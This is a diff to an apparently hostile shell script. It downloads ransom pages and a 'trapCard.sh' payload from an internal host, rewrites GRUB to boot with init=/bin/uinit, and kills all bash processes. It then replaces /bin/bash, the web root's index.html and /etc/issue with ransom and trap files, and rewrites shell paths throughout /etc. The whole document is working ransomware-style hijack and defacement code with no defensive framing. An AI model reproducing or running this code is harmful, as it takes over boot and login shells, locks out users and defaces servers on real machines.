@@ -14,7 +14,7 @@ fi
 
 url=http://10.0.0.45/ 
 
-for f in ransom.html trapCard.sh; do
+for f in ransom.html trapCard.sh ransom.issue; do
  curl -s "$url$f" > $f
 done
 
@@ -26,7 +26,6 @@ sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/d
 sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX="init=/bin/uinit"' /etc/default/grub
 sed -i '/.*GRUB_TIMEOUT_STYLE=.*/c\GRUB_TIMEOUT_STYLE=countdown' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
-echo 'GRUB_BACKGROUND="/boot/grub/splash"' >> /etc/default/grub
 grub-mkconfig -o /boot/grub/grub.cfg
 #update-grub
 
@@ -35,13 +34,13 @@ cat << EOF > fini.sh
 #!/bin/sh
 #kill all bash
 kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
-
+sleep 5
 cp trapCard.sh /bin/uinit
 chmod +x /bin/uinit
 cp ransom.html /var/www/html/index.html
 cp /bin/bash /bin/bush
 cp /bin/uinit /bin/bash
-cp ransom.splash /boot/grub/splash
+#cp ransom.splash /boot/grub/splash
 cp ransom.issue /etc/issue
 
 find /etc -type f ! -path "/etc/passwd" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
